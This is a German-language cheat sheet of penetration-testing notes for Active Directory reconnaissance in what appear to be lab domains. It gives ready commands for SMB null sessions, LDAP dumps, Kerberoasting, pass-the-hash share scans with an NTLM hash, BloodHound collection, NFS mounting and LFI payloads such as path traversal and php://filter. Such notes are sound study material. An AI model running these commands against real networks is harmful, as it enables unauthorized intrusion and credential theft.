# Reconnaissance

## Ziel der Reconnaissance-Phase

- Identifikation von Domain Controllern, Workstations und Servern
- Ermittlung von Benutzern, Gruppen und Service-Accounts
- Erkennung von Schwachstellen in der AD-Konfiguration
- Vorbereitung für initiale Zugriffsvektoren (LLMNR/NBT-NS Poisoning, SMB Relay, Kerberoasting)

---

## Host & Network Discovery

### Nmap Standard-Scan


```bash
# Basis-Scan für AD-Umgebung
nmap -sn 192.168.xx.x/24

# Service-Enumeration auf AD-Ports
nmap --script=smb2-security-mode.nse -p 445 192.168.xx.x/24 -Pn

# Umfassender Scan mit allen AD-relevanten Ports
sudo nmap -sC -sV 10.10.175.0/24 -p 445,139,88,389,636,80,443,22,3389 --open
```

### Kritische Ports

|Port|Dienst|Bedeutung|
|---|---|---|
|88|Kerberos|Authentifizierung|
|389|LDAP|Directory Services|
|636|LDAPS|LDAP über SSL|
|445|SMB|File Sharing, Remote Access|
|139|NetBIOS|Legacy SMB|
|3389|RDP|Remote Desktop|

---

## SMB Enumeration

### SMB Signing Detection


```bash
# SMB Signing Status prüfen
sudo nmap --script=smb2-security-mode.nse -p 445 192.168.xx.x/24 -Pn
```

**Wichtige Ergebnisse:**

- `enabled but not required` = Anfällig für NTLM Relay
- `enabled and required` = Geschützt gegen Relay

### Anonymer SMB-Zugriff


```bash
# Anonymous Login testen
smbclient -L //192.168.xx.x -N

# Null Session
rpcclient -U "" -N 10.10.255.70
```

### SMB Share Enumeration mit Credentials


```bash
# Share-Auflistung
smbclient -L //192.168.xx.x -U "MARVEL\mmustermann%Password1"

# CrackMapExec Share-Scan
crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
```

---

## LDAP Enumeration

### Basis LDAP-Abfragen


```bash
# Naming Contexts ermitteln
ldapsearch -H ldap://10.10.255.70 -x -s base namingcontexts

# User-Enumeration
ldapsearch -H ldap://10.10.255.70 -x -b "DC=lab,DC=trusted,DC=vl" "(objectClass=user)" sAMAccountName

# Manuelle LDAP-Bindung testen
ldapsearch -x -H ldap://192.168.xx.x -D "MARVEL\mmustermann" -w Password1 -b "DC=MARVEL,DC=local"
```

### ldapdomaindump (mit Credentials)


```bash
# Umfassender LDAP-Dump mit Authentifizierung
sudo ldapdomaindump ldaps://192.168.xx.x -u 'MARVEL\mmustermann' -p Password1

# Alternative ohne SSL
sudo ldapdomaindump ldap://192.168.xx.x -u 'MARVEL\mmustermann' -p Password1
```

**Generierte Dateien:**

- `domain_users.html` = Alle Domain-User
- `domain_groups.html` = Gruppen und Mitgliedschaften
- `domain_computers.html` = Computer-Accounts
- `domain_policy.html` = Domain-Policies
- `domain_users_by_group.html` = User nach Gruppen sortiert

---

## Kerberos Enumeration

### Kerbrute User-Enumeration


```bash
# Benutzer-Enumeration über Kerberos Pre-Auth
kerbrute userenum --dc 10.10.255.70 -d lab.trusted.vl /usr/share/seclists/Usernames/Names/names.txt
```

### Kerberoasting (SPN Enumeration)


```bash
# Service Principal Names abfragen und TGS-Tickets anfordern
impacket-GetUserSPNs MARVEL.local/mmustermann:Password1 -dc-ip 192.168.xx.x -request
```

**Prozess:**

1. AD nach Service Principal Names (SPNs) durchsuchen
2. TGS-Tickets für jeden SPN anfordern
3. Verschlüsselte Hashes für Offline-Cracking extrahieren

---

## NFS Enumeration

### NFS Shares anzeigen


```bash
# Verfügbare NFS-Exports prüfen
showmount -e 10.10.175.182
```

### NFS Mount


```bash
# NFS-Share mounten
sudo mkdir -p /tmp/mount
sudo mount -t nfs -o vers=3,nolock 10.10.175.182:/opt/share /tmp/mount

# Inhalt prüfen
ls -la /tmp/mount
```

---

## BloodHound Datensammlung

### Neo4j vorbereiten


```bash
# Neo4j starten
sudo neo4j console
```

**Neo4j Konfiguration:**

- Web-Interface: [http://localhost:7474/](http://localhost:7474/)
- Default-Credentials: neo4j:neo4j (beim ersten Login ändern)

### BloodHound Python Collector


```bash
# Alle Daten sammeln
sudo bloodhound-python -d MARVEL.local -u mmustermann -p Password1 -ns 192.168.xx.x -c all

# Nur Domain Controller
sudo bloodhound-python -d MARVEL.local -u mmustermann -p Password1 -ns 192.168.xx.x -c DCOnly

# Spezifische Sammlungen
sudo bloodhound-python -d MARVEL.local -u mmustermann -p Password1 -ns 192.168.xx.x -c Group,LocalAdmin
```

### BloodHound GUI starten


```bash
sudo bloodhound
```

**Import:**

1. "Upload Files" klicken
2. Alle JSON-Dateien auswählen (computers.json, users.json, groups.json)
3. Upload durchführen

---

## Trust Relationships

### PowerShell Trust-Enumeration

powershell

```powershell
# In Evil-WinRM oder lokalem PowerShell
Get-ADTrust -Filter *
```

### Impacket ldeep


```bash
# Trust-Beziehungen über LDAP
ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://10.10.255.70 trusts
```

### Domain SID ermitteln


```bash
# Child Domain SID
lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@10.10.255.70
```

---

## Vulnerability Scanning

### PrintNightmare (CVE-2021-1675)


````bash
# Print Spooler Service prüfen
impacket-rpcdump @192.168.xx.x | egrep 'MS-RPRN|MS-PAR'
```

**Erwartete Ausgabe bei Anfälligkeit:**
```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
````

### ZeroLogon (CVE-2020-1472)


```bash
# Anfälligkeit testen (ohne Exploit)
python3 zerologon_tester.py DC-NAME DC-IP

# Beispiel
python3 zerologon_tester.py ODIN-DC 192.168.xx.x
```

---

## Web-basierte Recon

### Directory Enumeration


```bash
# ffuf
ffuf -u http://10.10.255.70/dev/FUZZ -w /usr/share/wordlists/dirb/common.txt

# dirbuster
dirbuster -u http://10.10.255.70/ -l /usr/share/wordlists/dirb/common.txt
```

### LFI Testing


```bash
# Windows ini-Dateien testen
curl "http://10.10.255.70/dev/index.html?view=../../../../Windows/win.ini"

# PHP Filter für Source Code
curl "http://10.10.255.70/dev/index.html?view=php://filter/convert.base64-encode/resource=index.html"
```

---

## DNS & Hosts-Konfiguration

### /etc/hosts pflegen


```bash
# Single Entry
echo "10.10.175.182 mail01.hybrid.vl" | sudo tee -a /etc/hosts

# Multiple Entries (kritisch für Trust-Attacks)
echo "10.10.255.70 lab.trusted.vl labdc.lab.trusted.vl" | sudo tee -a /etc/hosts
echo "10.10.255.69 trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts
```

---

## Typische Findings & Hinweise

### SMB Signing

- Systeme mit `enabled but not required` in targets.txt für SMB Relay eintragen
- Domain Controller haben meist `required` → nicht für Relay geeignet

### LDAP Enumeration

- LDAPS (Port 636) bevorzugen, wenn verfügbar
- Anonymous Bind häufig deaktiviert → Credentials erforderlich
- `domain_users_by_group.html` zeigt privilegierte Accounts

### Kerberos

- SPNs identifizieren Service-Accounts (oft schwache Passwörter)
- Kerbrute funktioniert auch ohne Credentials
- Pre-Auth disabled = AS-REP Roasting möglich

### BloodHound

- `-c all` sammelt: Users, Groups, Computers, Sessions, Trusts, GPOs
- Suche nach: Domain Admins, Kerberoastable Users, Unconstrained Delegation
- Pathfinding: Start Node → Domain Admins zeigt Angriffswege

### Trust Relationships

- Child-to-Parent Escalation möglich bei AD-Trusts
- SID-History kann für Golden Ticket Attacks missbraucht werden
- DNS-Einträge für beide Domains erforderlich

### NFS

- Backup-Dateien können Credentials enthalten
- UID-Spoofing ermöglicht Zugriff auf User-Daten
- `/opt/share` ist häufiger Export-Name

---

## Reconnaissance Workflow

### Phase 1: Netzwerk-Discovery

bash

```bash
# 1. Host-Discovery
nmap -sn 192.168.xx.x/24

# 2. SMB Signing Check
nmap --script=smb2-security-mode.nse -p 445 192.168.xx.x/24 -Pn

# 3. Target-Liste erstellen
echo "192.168.xx.x" > targets.txt
echo "192.168.xx.x" >> targets.txt
```

### Phase 2: Service-Enumeration


```bash
# 1. LDAP Naming Contexts
ldapsearch -H ldap://192.168.xx.x -x -s base namingcontexts

# 2. Kerbrute User-Enum (optional, ohne Creds)
kerbrute userenum --dc 192.168.xx.x -d MARVEL.local /usr/share/seclists/Usernames/Names/names.txt

# 3. PrintNightmare Check
impacket-rpcdump @192.168.xx.x | egrep 'MS-RPRN|MS-PAR'
```

### Phase 3: Authenticated Enumeration (nach Initial Access)


```bash
# 1. LDAP Domain Dump
sudo ldapdomaindump ldaps://192.168.xx.x -u 'MARVEL\mmustermann' -p Password1

# 2. BloodHound Collection
sudo bloodhound-python -d MARVEL.local -u mmustermann -p Password1 -ns 192.168.xx.x -c all

# 3. Kerberoasting
impacket-GetUserSPNs MARVEL.local/mmustermann:Password1 -dc-ip 192.168.xx.x -request
```

